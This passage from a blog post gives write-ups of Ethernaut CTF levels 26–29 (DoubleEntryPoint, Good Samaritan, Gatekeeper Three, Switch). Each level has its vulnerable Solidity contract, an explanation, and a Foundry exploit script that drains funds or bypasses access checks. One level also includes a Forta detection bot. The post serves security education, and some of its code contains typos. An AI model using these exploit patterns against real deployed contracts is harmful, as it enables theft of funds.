`LegacyToken` also has function `transfer()` which is where the bug is,\n\n```solidity\n function transfer(\n        address to,\n        uint256 value\n    ) public override returns (bool) {\n        if (address(delegate) == address(0)) {\n            return super.transfer(to, value);\n        } else {\n            return delegate.delegateTransfer(to, value, msg.sender);\n        }\n    }\n```\n\n6. When I checked, the `delegate` is actually the address of the `DoubleEntryPoint` and it is assigned to delegate in LegacyToken contract.\n\n![Delegate Address Screenshot](/images/ethernaut-delegate-address.png)\n\n```\n foundry command: $ cast 4 0xc89e4361\n Output:          delegate()\n```\n\n7. Here the `delegate` == `DET` address. Which means the LegacyToken contract is calling the `delegateTransfer()` function of `DoubleEntryPoint` contract. See the `delegateTransfer()` function below and observe what it is doing.\n\n```solidity\n function delegateTransfer(\n        address to,\n        uint256 value,\n        address origSender\n    ) public override onlyDelegateFrom fortaNotify returns (bool) {\n        _transfer(origSender, to, value);\n        return true;\n    }\n```\n\n8. Its sending the `DET` tokens to the `to` address from the `origSender` of `value`.\n\n9. When this function executes it transfers DET tokens of `origSender` to the `to` address. `CryptoVault` holds 100 DET tokens.\n\n10. So, if the `origSender` is CryptoVault and the call to `delegateTransfer()` was made by `LegacyToken` and no alerts from the `fortaNotify` will transfer DET tokens from CryptoVault. (Ignore fortaNotify as they are not yet implmented)\n\n11. The `delegateTransfer()` is called by LegacyToken contract from the `transfer()` function. The `origSender` is the `msg.sender` of transfer() function in LegacyToken.\n\n12. So, we have to make the CryptoVault to call the `transfer()` function of the LegacyToken.\n\n13. We see the one `transfer()` call is made on the `token` by CryptoVault inside `sweepToken()` function.\n\n```solidity\nfunction sweepToken(IERC20 token) public {\n        require(token != underlying, \"Can't transfer underlying token\");\n        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));\n    }\n```\n\n14. To make the LegacyToken `tranfer()` called by the CryptoVault, we need to pass the LegacyToken instance to the `sweepToken()` function.\n\n15. Now the `CryptoVault` balance of DET token becomes zero.\n\n16. We identified the bug and sweeped out the DET tokens of the CryptoVault.\n\n17. Now we have to write a `detectionbot` to catch this bug. We are given with `Forta` interface which can be used to build the bot.\n\n18. We have to build a bot that raises an alert when we see any transaction that transfers DET tokens from CryptoVault.\n\n19. The `msg.data` that received at `fortNotify()`\n\n```\ndata = \u003cdelegateTransfer() signature\u003e \u003cto\u003e \u003cvalue\u003e \u003corigSender\u003e\n```\n\n20. If we access `msg.data` inside `handleTransaction()`,\n\n```\nmsg.data = \u003chandleTransaction() signature\u003e \u003cuser\u003e \u003cdata\u003e\n```\n\n21. We need to extract `origSender` from the `msg.data` inside `handleTransaction()` function implemented in our bot contract.\n\n22. Lets see how the calldata at `handleTransaction()` is looks like,\n\n```\n0x00 : handleTransaction signature[4 bytes]\n0x04 : 0000....0000 // \u003cuser\u003e address\n0x24 : 0000....0000 // offset of the \u003cdata\u003e\n0x44 : 0000....0000 // length of the \u003cdata\u003e\n---------start of the data---------\n0x64 : \u003cdelegateTransfer() signature\u003e [4 bytes]\n0x68 : 0000....0000 // \u003cto\u003e address\n0x88 : 0000....0000 // \u003cvalue\u003e\n0xA8 : 0000....0000 // \u003corigSender\u003e\n```\n\n23. So, the `origSender` is from the `0xA8` byte of the `msg.data` inside `handleTransaction()` function.\n\n24. We can use `calldataload` opcode to access the `origSender`. And if the origSender is equals to CryptoVault then raise an alert.\n\n25. Now the bot is ready, we have to deploy it and register the bot at `Forta` contract.\n\n**Level26Solution.s.sol**\n\n```solidity\n//SPDX-License-Identifier :MIT\npragma solidity ^0.8.24;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\nimport \"../src/Level26.sol\";\n\ncontract Level26Sol is Script{\n\n    DoubleEntryPoint public dep = DoubleEntryPoint(0xcE33ED049f763622a132480D7348B212777Ee61E);\n\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        address cryptoVault = dep.cryptoVault();\n        address player = dep.player();\n        address delegatedFrom = dep.delegatedFrom();\n\n        console.log(\"CryptoVault is \",cryptoVault);\n        console.log(\"Player is \",player);\n        console.log(\"LegacyToken is \",delegatedFrom);\n\n        LegacyToken lgt = LegacyToken(delegatedFrom);\n        CryptoVault cv = CryptoVault(cryptoVault);\n\n        console.log(\"Balance of DET in CryptoVault\", dep.balanceOf(cryptoVault));\n        console.log(\"Balance of LGT in CryptoVault\", lgt.balanceOf(cryptoVault));\n\n        console.log(\"The following two address are same\");\n        console.log(\"Delegate of Legacytoken contract\",address(lgt.delegate()));\n        console.log(\"DET :\", address(dep));\n\n        Forta forta = dep.forta();\n\n        //registering bot\n        DetectionBot bot = new DetectionBot();\n        forta.setDetectionBot(address(bot));\n\n        console.log(\"BOT ALERTS Before  exploit :\", forta.botRaisedAlerts(address(bot)));\n\n        new Attack().exploit(); //reverted by bot when it tries to exploit\n\n        console.log(\"Cryptovault balance of DET :\", dep.balanceOf(cryptoVault));\n        console.log(\"BOT alerts after exploit: \",forta.botRaisedAlerts(address(bot)));\n\n        vm.stopBroadcast();\n\n    }\n}\n\ncontract Attack{\n\n    DoubleEntryPoint public dep = DoubleEntryPoint(0xcE33ED049f763622a132480D7348B212777Ee61E);\n    address public cryptoVault = dep.cryptoVault();\n    address public delegatedFrom = dep.delegatedFrom();\n\n    function exploit() public {\n        CryptoVault cv = CryptoVault(cryptoVault);\n        cv.sweepToken(IERC20(delegatedFfrom));\n    }\n}\n\ncontract DetectionBot{\n    DoubleEntryPoint public dep = DoubleEntryPoint(0xcE33ED049f763622a132480D7348B212777Ee61E);\n    address public  cryptoVault = dep.cryptoVault();\n\n    function handleTransaction(address user, bytes calldata msgData)external{\n\n        address origSender;\n        assembly{\n            origSender:=  calldataload(0xa8)\n        }\n\n        if(origSender == cryptoVault){\n            Forta(msg.sender).raiseAlert(user);\n        }\n    }\n}\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level26Solution.s.sol:Level26Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Good Samaritan\n\n**Level27.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity \u003e=0.8.0 \u003c0.9.0;\n\nimport \"openzeppelin-contracts/contracts/utils/Address.sol\";\n\ncontract GoodSamaritan {\n    Wallet public wallet;\n    Coin public coin;\n\n    constructor() {\n        wallet = new Wallet();\n        coin = new Coin(address(wallet));\n\n        wallet.setCoin(coin);\n    }\n\n    function requestDonation() external returns(bool enoughBalance){\n        // donate 10 coins to requester\n        try wallet.donate10(msg.sender) {\n            return true;\n        } catch (bytes memory err) {\n            if (keccak256(abi.encodeWithSignature(\"NotEnoughBalance()\")) == keccak256(err)) {\n                // send the coins left\n                wallet.transferRemainder(msg.sender);\n                return false;\n            }\n        }\n    }\n}\n\ncontract Coin {\n    using Address for address;\n\n    mapping(address =\u003e uint256) public balances;\n\n    error InsufficientBalance(uint256 current, uint256 required);\n\n    constructor(address wallet_) {\n        // one million coins for Good Samaritan initially\n        balances[wallet_] = 10**6;\n    }\n\n    function transfer(address dest_, uint256 amount_) external {\n        uint256 currentBalance = balances[msg.sender];\n\n        // transfer only occurs if balance is enough\n        if(amount_ \u003c= currentBalance) {\n            balances[msg.sender] -= amount_;\n            balances[dest_] += amount_;\n\n            //if(dest_.isContract()) {\n            if (dest_.code.length != 0){\n                // notify contract\n                INotifyable(dest_).notify(amount_);\n            }\n        } else {\n            revert InsufficientBalance(currentBalance, amount_);\n        }\n    }\n}\n\ncontract Wallet {\n    // The owner of the wallet instance\n    address public owner;\n\n    Coin public coin;\n\n    error OnlyOwner();\n    error NotEnoughBalance();\n\n    modifier onlyOwner() {\n        if(msg.sender != owner) {\n            revert OnlyOwner();\n        }\n        _;\n    }\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    function donate10(address dest_) external onlyOwner {\n        // check balance left\n        if (coin.balances(address(this)) \u003c 10) {\n            revert NotEnoughBalance();\n        } else {\n            // donate 10 coins\n            coin.transfer(dest_, 10);\n        }\n    }\n\n    function transferRemainder(address dest_) external onlyOwner {\n        // transfer balance left\n        coin.transfer(dest_, coin.balances(address(this)));\n    }\n\n    function setCoin(Coin coin_) external onlyOwner {\n        coin = coin_;\n    }\n}\n\ninterface INotifyable {\n    function notify(uint256 amount) external;\n}\n```\n\n**Goal:**\n\nWould you be able to drain all the balance from his Wallet?\n\n**Explanation:**\n\n1. There in total three contract are given to us. `GoodSamaritan` contract deployes `Wallet` and `Coin` contracts.\n2. Good samaritan will be the `owner` of the `Wallet` contract. And the wallet contract will have 10**6 Coin balances.\n3. We are given with the GoodSamaritan instance address. We can able to call the `requestDonation()` function to get 10 coins from the GoodSamaritan’s Wallet.\n4. One call to `requestDonation()` will get 10 coins only. To drain all the coins of the Wallet we need to call the `requestDonation()` function `100000` times which requires more gas.\n5. Instead we can try to invoke the `withdrawRemainder()` function which will send all the coins at a time.\n6. The `withdrawRemainder()` is called when the `wallet.donate10(msg.sender)` returns error `NotEnoughBalance()` defined inside Wallet contract.\n7. GoodSamaritan contract expects the error from the Wallet contract only. But as per the solidity docs, the error may be raised and bubbled up by any intermediary contract. That means we cannot predict the origin of the error.\n8. So, can we raise error by ourself to the GoodSamaritan..? yes, When transfering 10 coins to the sender inside the `Coin` contract it notifies the sender if the sender is a contract.\n9. This means it calls to our `msg.sender`, now we can implement the `notify()` function inside our Attack contract and revert with the `NotEnoughBalance()` error when receiving the 10 coins.\n10. We should revert the `NotEnoughBalance()` error when only receiving the 10 coins not when the GoodSamaritan sending whole coins.\n11. For this I used the amount parameter sent by the Coin contract through the notify call.\n12. Now GoodSamaritan gets the error `NotEnoughBalance()` when it sends 10 coins to us, immediately it will send whole coins to us.\n\n**Level27Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\nimport \"../src/Level27.sol\";\n\ncontract Level27Sol is Script {\n    GoodSamaritan public instance =\n        GoodSamaritan(0x99A5FD376b27d513922E7b0bc36DbBb1941b31F6);\n\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        console.log(\n            \"Balance of Wallet before attack\",\n            instance.coin().balances(address(instance.wallet()))\n        );\n\n        new Attack().exploit();\n\n        console.log(\n            \"Balance of Wallet after attack\",\n            instance.coin().balances(address(instance.wallet()))\n        );\n\n        vm.stopBroadcast();\n    }\n}\n\ncontract Attack {\n    error NotEnoughBalance();\n\n    GoodSamaritan public instance =\n        GoodSamaritan(0x99A5FD376b27d513922E7b0bc36DbBb1941b31F6);\n\n    function exploit() public {\n        instance.requestDonation();\n    }\n\n    function notify(uint256 amount) external {\n        if (amount = 10) {\n            // only revert when receiving 10 coins\n            revert NotEnoughBalance();\n        }\n    }\n}\n\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level27Solution.s.sol:Level27Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Gatekeeper Three\n\n**Level28.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract SimpleTrick {\n    GatekeeperThree public target;\n    address public trick;\n    uint256 private password = block.timestamp;\n\n    constructor(address payable _target) {\n        target = GatekeeperThree(_target);\n    }\n\n    function checkPassword(uint256 _password) public returns (bool) {\n        if (_password == password) {\n            return true;\n        }\n        password = block.timestamp;\n        return false;\n    }\n\n    function trickInit() public {\n        trick = address(this);\n    }\n\n    function trickyTrick() public {\n        if (address(this) == msg.sender \u0026\u0026 address(this) != trick) {\n            target.getAllowance(password);\n        }\n    }\n}\n\ncontract GatekeeperThree {\n    address public owner;\n    address public entrant;\n    bool public allowEntrance;\n\n    SimpleTrick public trick;\n\n    function construct0r() public {\n        owner = msg.sender;\n    }\n\n    modifier gateOne() {\n        require(msg.sender == owner);\n        require(tx.origin != owner);\n        _;\n    }\n\n    modifier gateTwo() {\n        require(allowEntrance == true);\n        _;\n    }\n\n    modifier gateThree() {\n        if (address(this).balance \u003e 0.001 ether \u0026\u0026 payable(owner).send(0.001 ether) == false) {\n            _;\n        }\n    }\n\n    function getAllowance(uint256 _password) public {\n        if (trick.checkPassword(_password)) {\n            allowEntrance = true;\n        }\n    }\n\n    function createTrick() public {\n        trick = new SimpleTrick(payable(address(this)));\n        trick.trickInit();\n    }\n\n    function enter() public gateOne gateTwo gateThree {\n        entrant = tx.origin;\n    }\n\n    receive() external payable {}\n}\n```\n\n**Goal:**\n\nCope with gates and become an entrant.\n\n**Explanation:**\n\n1. Similar to GatekeeperOne and GatekeeperTwo we need to pass the three gate checks by the modifiers when calling the `enter()` function.\n2. `gateOne()` can be bypassed if we are the owner of the contract and we need call from a contract.\n3. To be be the owner we can call the `construct0r()` function its not the actual constructor(), so we can be the owner after calling it.\n4. `gateTwo()` will be passed if we managed to change the `allowEntrance` value to true. To do it, we need to call the `getAllowance()` function with the right password defined inside SimpleTrick contract.\n5. So, we need to deploy a SimpleTrick contract first, we can do this by calling `createTrick()` function.\n6. After that we need to find the password stored inside SimpleTrick contract. We can do this by using `vm.load` cheatcode or we can find the password inside our Attack contract.\n7. Because the password is the `block.timestamp` which will be same during a transaction. If we deploy the SimpeToken and get the block.timestamp inside same call, the block.timestamp will be the password for us.\n8. Callling `getAllowance()` with this value will pass the gateTwo.\n9. For `gateThree()` the balance of the GatekeeperThree should be greater than 0.001 ether and when the GatekeeperThree sends 0.001 ether to owner it should return false.\n10. Remember owner is out attack contract, GatekeeperThree sending ether using `send` call. `send` call will return `false` when the transaction fails.\n11. So, we have to deny the ether sent by the GatekeeperThree. To do this, I haven’t implemented any fallback or receive function inside my Attack contract.\n12. For this reason the send will return false to GatekeeperThree contract and now we will able to register as entrant.\n\n**Level28Solution.s.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\nimport \"../src/Level28.sol\";\n\ncontract Level28Sol is Script {\n    GatekeeperThree public instance = GatekeeperThree(payable(0x1B3158cc2634Fbf84299D79D52a2E63680B63559));\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        console.log(\"Gate Owner : \", instance.owner());\n\n        Attack attack = new Attack{value: 0.009 ether}();\n        attack.exploit();\n\n        console.log(\"Allow Entrance : \", instance.allowEntrance());\n        console.log(\"Gate keeper Owner : \", instance.owner());\n        console.log(\"Entrant : \", instance.entrant());\n        vm.stopBroadcast();\n    }\n}\n\ncontract Attack {\n    GatekeeperThree public instance = GatekeeperThree(payable(0x1B3158cc2634Fbf84299D79D52a2E63680B63559));\n\n    constructor() payable{}\n    function exploit() public {\n\n        instance.construct0r();//bypassed first gate\n\n        //bypassing second gate\n        instance.createTrick();\n\n        // uint256 password = vm.getBlockTimestamp();\n        instance.getAllowance(block.timestamp);\n\n        (bool success, ) = payable(address(instance)).call{value : address(this).balance}(\"\");\n        require(success, \"Tx Failed\");\n\n        instance.enter();\n\n    }\n}\n```\n\n**To run the script**\n\n```\n$ source .env\n$ forge script script/Level28Solution.s.sol:Level28Sol --rpc-url $RPC_URL --broadcast\n```\n\n## Switch\n\n**Level29.sol**\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Switch {\n    bool public switchOn; // switch is off\n    bytes4 public offSelector = bytes4(keccak256(\"turnSwitchOff()\"));\n\n    modifier onlyThis() {\n        require(msg.sender == address(this), \"Only the contract can call this\");\n        _;\n    }\n\n    modifier onlyOff() {\n        // we use a complex data type to put in memory\n        bytes32[1] memory selector;\n        // check that the calldata at position 68 (location of _data)\n        assembly {\n            calldatacopy(selector, 68, 4) // grab function selector from calldata\n        }\n        require(selector[0] == offSelector, \"Can only call the turnOffSwitch function\");\n        _;\n    }\n\n    function flipSwitch(bytes memory _data) public onlyOff {\n        (bool success,) = address(this).call(_data);\n        require(success, \"call failed :(\");\n    }\n\n    function turnSwitchOn() public onlyThis {\n        switchOn = true;\n    }\n\n    function turnSwitchOff() public onlyThis {\n        switchOn = false;\n    }\n}\n```\n\n**Goal:**\n\nJust have to flip the switch.\n\n**Explanation:**\n\n1. Switch contract has three functions `turnSwitchOff()`, `turnSwitchOn()` and `flipSwitch()`. We can only able to call flipSwitch function.\n2. By using this flipSwitch only we have to call the `turnSwitchOn()` function. For this we need to pass the calldata for the function call `turnSwitchOn()`.\n3. But If we pass the `turnSwitchOn()` calldata to the `flipSwitch()` it will be reverted by `onlyOff` modifier.\n4. Because, onlyOff is checking that the calldata’s 68 to 72 bytes should only contain the signature of the `turnSwitchOff()` function.\n5. The vulnerability is present inside the `onlyOff()` modifier as its function signature check byte position is hardcoded (68,4).\n6. We can modify the `calldata` in order to bypass the check and as well as call the `turnSwitchOn()` function.\n7. When we call a function on a contract, the `calldata` will be sent via the transaction as `msg.data.`\n8. Now, we have to send the `turnSwitchOn()` signature along with this `calldata`. And we should make sure that only `turnSwitchOn()` signature should be passed to the `call` inside `flipSwitch()`.\n9. The data which is used inside the function will be specified by the `offset`. The function will make use of the actual data that is pointed by the offset.\n10. As the `onlyOff` modifier uses the hardcoded check, we can modify the calldata to be able to insert the `turnSwitchOff()` function signature at the 68th bytes and append the `turnSwitchOn()` signature.\n11. Now we have to change the offset of the calldata in such a way that it points to the `turnSwitchOn()` signature.\n\n```\ncalldata to bypass onlyOff\n  =\u003e \u003cflipSwitch Singature\u003e \u003cOffset\u003e \u003cDummy Data\u003e \u003cturnSwitchOff Signature\u003e \u003clength of data\u003e \u003cturnSwitchOn Signature\u003e\n\n  30c13ade - flipSwitch(bytes)\n\n[000]: 0000000000000000000000000000000000000000000000000000000000000060 --offset position for actual data\n[020]: 0000000000000000000000000000000000000000000000000000000000000000 --adding dummy bytes to bypass the check\n[040]: 20606e1500000000000000000000000000000000000000000000000000000000 --turnSwitchOff()--ByPassed onlyOff modifier\n[060]: 0000000000000000000000000000000000000000000000000000000000000004 --Length of the turnSwitchOff() signature data\n[080]: 76227e1200000000000000000000000000000000000000000000000000000000 --turnSwitchOn()-- Won the challenge\n```\n\n12.Now this `calldata` will bypasses the check of `onlyOff` and we modified the offset to point it to the `turnSwitchOn()` signature.\n\n13.This will call the `turnSwitchOn()` function in Switch contract.\n\n**Level29Solution.s.sol**\n\n```solidity\n// SPDX- License-Identifier :MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\nimport \"../src/Level29.sol\";\n\ncontract Level29Sol is Script{\n\n    Switch public instance  = Switch(0xBAfeeF31f97943fe11de5a04138f1AED8297aBb6);\n\n    function run() external {\n\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        bytes memory data = abi.encodeWithSignature(\"flipSwitch(bytes)\",0x60,\n         0x00, 0x20606e1500000000000000000000000000000000000000000000000000000000,0x04,\n         0x76227e1200000000000000000000000000000000000000000000000000000000);\n\n        console.logBytes(data);\n\n         address(instance).call(data);\n         /*\n\n         -----------------------------------------------console.log(data)----------------------------------------\n          Possible methods:\n            30c13ade      - flipSwitch(bytes)\n            ------------\n            [000]: 0000000000000000000000000000000000000000000000000000000000000060 --offset position for actual data\n            [020]: 0000000000000000000000000000000000000000000000000000000000000000 --adding dummy bytes to bypass the check\n            [040]: 20606e1500000000000000000000000000000000000000000000000000000000 --turnSwitchOff()--ByPassed onlyOff modifier\n            [060]: 0000000000000000000000000000000000000000000000000000000000000004 --Length of the turnSwitchOff() signature data\n            [080]: 76227e1200000000000000000000000000000000000000000000000000000000 --turnSwitchOn()-- Won the challenge\n\n         */\n\n         console.log(\"Switch is :\", instance.switchOn());\n\n         vm.stopBroadcast();\n\n    }\n}\n```\n\n**To run the script:**\n\n```\n$ source .env\n$ forge script script/Level29Solution.s.sol:Level29Sol --rpc-url $RPC_URL --broadcast\n```\n\n\n"])</script><script>self.__next_f.push([1,"7:[\"$\",\"div\",null,{\"className\":\"min-h-screen\",\"children\":[[\"$\",\"$L10\",null,{}],[\"$\",\"main\",null,{\"className\":\"pt-24 pb-16 px-4 sm:px-6 lg:px-8\",\"children\":[\"$\",\"$L11\",null,{\"blog\":{\"slug\":\"ethernaut-ctf-challenges-writeups\",\"title\":\"Ethernaut CTF Challenges Writeups\",\"excerpt\":\"CTF challenges for best security practices in smart contracts\",\"date\":\"2023-11-01\",\"readTime\":\"30 min read\",\"tags\":[\"Solidity\",\"Ethernaut\",\"Openzeppelin\",\"CTF\",\"Writeups\"],\"image\":\"/ethernaut11.png\",\"content\":\"$12\"}}]}]]}]\n"])</script><script>self.__next_f.push([1,"c:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}],[\"$\",\"meta\",\"1\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\n"])</script><script>self.__next_f.push([1,"13:I[53960,[\"/_next/static/chunks/cc162e5663281663.js\",\"/_next/static/chunks/db909c0d74f8c046.js\"],\"IconMark\"]\ne:[[\"$\",\"title\",\"0\",{\"children\":\"Satya Bhaskar Peruri\"}],[\"$\",\"meta\",\"1\",{\"name\":\"description\",\"content\":\"Security researcher, auditor, and blockchain developer specializing in smart contract security and Web3 development\"}],[\"$\",\"meta\",\"2\",{\"name\":\"generator\",\"content\":\"Me\"}],[\"$\",\"link\",\"3\",{\"rel\":\"icon\",\"href\":\"/sun9.png\",\"media\":\"(prefers-color-scheme: light)\"}],[\"$\",\"link\",\"4\",{\"rel\":\"icon\",\"href\":\"/sun9.png\",\"media\":\"(prefers-color-scheme: dark)\"}],[\"$\",\"link\",\"5\",{\"rel\":\"icon\",\"href\":\"/sun9.png\",\"type\":\"image/svg+xml\"}],[\"$\",\"link\",\"6\",{\"rel\":\"apple-touch-icon\",\"href\":\"/sun9.png\"}],[\"$\",\"$L13\",\"7\",{}]]\na:null\n"])</script></body></html>